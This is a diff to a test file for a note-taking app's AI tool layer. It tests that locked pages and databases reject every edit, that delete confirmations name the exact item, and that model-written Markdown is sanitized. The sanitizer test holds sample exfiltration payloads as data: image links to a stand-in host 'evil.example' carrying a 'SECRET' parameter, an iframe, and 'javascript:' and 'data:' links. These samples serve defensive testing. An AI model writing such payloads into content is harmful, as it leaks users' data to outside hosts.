@@ -1,7 +1,7 @@
 import "fake-indexeddb/auto";
 import { beforeEach, describe, expect, it } from "vitest";
 import { db } from "../../db";
-import { callTool, slateTools, validate } from "./tools";
+import { callTool, safeMarkdown, slateTools, validate } from "./tools";
 
 /** stand-ins for the editor's Markdown conversion: one paragraph per line */
 const written: string[] = [];
@@ -67,15 +67,67 @@ describe("pages", () => {
     expect(written).toContain(trip.id);
   });
 
-  it("a trashed page is gone for the tools, and a locked page is not rewritten", async () => {
+  it("a locked page cannot be changed in any way, and a trashed page is gone for the tools", async () => {
     const p = (await call("create_page", { title: "舊筆記", markdown: "內容" })).data;
     await db.pages.update(p.id, { locked: true });
-    expect(await call("update_page", { id: p.id, markdown: "改掉" })).toMatchObject({ error: true });
-    expect((await call("read_page", { id: p.id })).data.content).toBe("內容");
+    for (const input of [{ markdown: "改掉" }, { markdown: "加一行", mode: "append" }, { title: "改名" }, { icon: "🔥" }]) {
+      expect(await call("update_page", { id: p.id, ...input })).toMatchObject({ error: true });
+    }
+    expect(await call("trash_page", { id: p.id })).toMatchObject({ error: true });
+    const kept = (await db.pages.get(p.id))!;
+    expect([kept.title, kept.icon, !!kept.deletedAt]).toEqual(["舊筆記", undefined, false]);
+    expect((await call("read_page", { id: p.id })).data.content).toBe("內容"); // reading is still fine
+    await db.pages.update(p.id, { locked: false });
     expect((await call("trash_page", { id: p.id })).data).toMatchObject({ trashed: true });
     expect(await call("read_page", { id: p.id })).toMatchObject({ error: true });
     expect((await call("search", { query: "舊筆記" })).data.pages).toEqual([]);
     expect(await db.pages.get(p.id)).toBeTruthy(); // in the trash, not destroyed
+  });
+});
+
+describe("what the person is asked before something is destroyed", () => {
+  it("names the exact page or task, and how much goes with it", async () => {
+    const trash = tools.find((t) => t.name === "trash_page")!;
+    const del = tools.find((t) => t.name === "delete_task")!;
+    const top = (await call("create_page", { title: "專案" })).data;
+    const kid = (await call("create_page", { title: "會議記錄", parent_id: top.id })).data;
+    await call("create_page", { title: "更深", parent_id: kid.id });
+    expect(await trash.describe({ id: top.id })).toBe("把頁面「專案」和它底下的 2 個項目移到垃圾桶");
+    expect(await trash.describe({ id: kid.id })).toBe("把頁面「會議記錄」和它底下的 1 個項目移到垃圾桶");
+    const t = (await call("add_task", { title: "搬家" })).data;
+    await call("add_task", { title: "打包", parent_task: t.id });
+    expect(await del.describe({ id: t.id })).toBe("永久刪除任務「搬家」和它的 1 個子任務");
+    // an id that does not exist is not dressed up as something else
+    expect(await del.describe({ id: "nope" })).toBe("永久刪除任務");
+  });
+});
+
+describe("content written by a model", () => {
+  it("cannot make the app load anything from the internet or run script", () => {
+    const md = [
+      "正常文字和 [連結](https://example.com/a)",
+      "![追蹤](https://evil.example/p.png?d=SECRET)",
+      "![](<https://evil.example/q.png> \"title\")",
+      '<img src="https://evil.example/r.png">',
+      "<iframe src=https://evil.example></iframe>",
+      "[點我](javascript:alert(1))",
+      "[資料](data:text/html;base64,AAAA)",
+      "![本機圖片](idb://abc123)",
+    ].join("\n");
+    const out = safeMarkdown(md);
+    expect(out).not.toMatch(/!\[[^\]]*\]\(\s*<?https?:/); // no remote picture left
+    expect(out).not.toMatch(/<img|<iframe|javascript:|data:text/i);
+    expect(out).toContain("[追蹤](https://evil.example/p.png?d=SECRET)"); // kept as a link the person may choose to click
+    expect(out).toContain("[連結](https://example.com/a)");
+    expect(out).toContain("![本機圖片](idb://abc123)"); // the workspace's own attachments still show
+  });
+
+  it("is cleaned on the way into a page", async () => {
+    const p = (await call("create_page", { title: "x", markdown: "![a](https://evil.example/1.png)" })).data;
+    await call("update_page", { id: p.id, markdown: "![b](https://evil.example/2.png)", mode: "append" });
+    const stored = JSON.stringify((await db.pages.get(p.id))!.content);
+    expect(stored).not.toContain("![");
+    expect(stored).toContain("[a](https://evil.example/1.png)");
   });
 });
 
@@ -105,6 +157,11 @@ describe("databases", () => {
 
     expect((await call("update_row", { id: lunch.id, values: { 已報帳: true, 金額: 150, 日期: null } })).data).toEqual({ id: lunch.id, title: "午餐", 金額: 150, 類別: "餐飲", 已報帳: true });
     expect(await call("update_row", { id: lunch.id, values: { 不存在: 1 } })).toMatchObject({ error: true });
+    // a locked database takes no new rows and no changes to the ones it has
+    await db.pages.update(d.id, { locked: true });
+    expect(await call("add_row", { database_id: d.id, title: "晚餐" })).toMatchObject({ error: true });
+    expect(await call("update_row", { id: lunch.id, values: { 金額: 1 } })).toMatchObject({ error: true });
+    await db.pages.update(d.id, { locked: false });
     expect((await call("update_row", { id: lunch.id, values: { 日期: "三月一日" } })).text).toContain("YYYY-MM-DD");
   });
 });
